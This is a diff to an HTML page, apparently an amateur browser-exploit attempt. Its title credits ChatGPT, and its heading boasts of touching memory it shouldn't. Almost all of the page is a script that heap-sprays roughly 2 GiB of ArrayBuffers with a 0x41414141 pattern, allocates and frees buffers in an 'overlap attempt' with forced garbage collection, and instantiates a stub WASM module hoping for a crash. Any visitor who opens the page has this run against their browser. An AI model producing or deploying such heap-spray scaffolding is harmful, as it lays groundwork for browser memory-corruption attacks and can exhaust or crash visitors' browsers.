@@ -1,13 +1,48 @@
-<h1>hi</h1>
-<script>const shellcode = new Uint8Array(1024 * 1024).fill(0x41);
-const buffers = [];
+<!DOCTYPE html>
+<html>
+<head><title>chatgpt made this beautiful memory fucker 3000 for me :3</title></head>
+<body>
+  <h1>cromos bingbang: Touching memory it shouldn’t 😎</h1>
+  <script>
+    const buffers = [];
+    const NUM = 0x2000;
+    const SIZE = 0x40000;
 
-for (let i = 0; i < 0x1000; i++) {
-  let buf = new ArrayBuffer(0x10000);
-  let view = new DataView(buf);
-  for (let j = 0; j < 0x10000; j += 4) {
-    view.setUint32(j, 0x41414141, true);
-  }
-  buffers.push(buf);
-}
-</script>
+    // Heap spray with controlled pattern
+    for (let i = 0; i < NUM; i++) {
+      const ab = new ArrayBuffer(SIZE);
+      const view = new DataView(ab);
+      for (let j = 0; j < SIZE; j += 4) {
+        view.setUint32(j, 0x41414141, true); // Controlled pattern
+      }
+      buffers.push(ab);
+    }
+
+    // Backing store overlap attempt
+    for (let i = 0; i < 10000; i++) {
+      const buf1 = new ArrayBuffer(0x1000);
+      const buf2 = new ArrayBuffer(0x1000);
+      let view1 = new Uint32Array(buf1);
+      let view2 = new Uint32Array(buf2);
+
+      view1[0] = 0x13371337;
+      view2[0] = 0xDEADC0DE;
+
+      // Realloc + GC trigger
+      view1 = null;
+      view2 = null;
+      if (typeof gc === 'function') gc();
+    }
+
+    // WASM test
+    const wasmCode = new Uint8Array([
+      0x00, 0x61, 0x73, 0x6d, // WASM magic
+      0x01, 0x00, 0x00, 0x00, // WASM version
+      // Add functions here later
+    ]);
+    WebAssembly.instantiate(wasmCode).catch(e => {
+      console.log("WASM crash? 🔥", e);
+    });
+  </script>
+</body>
+</html>
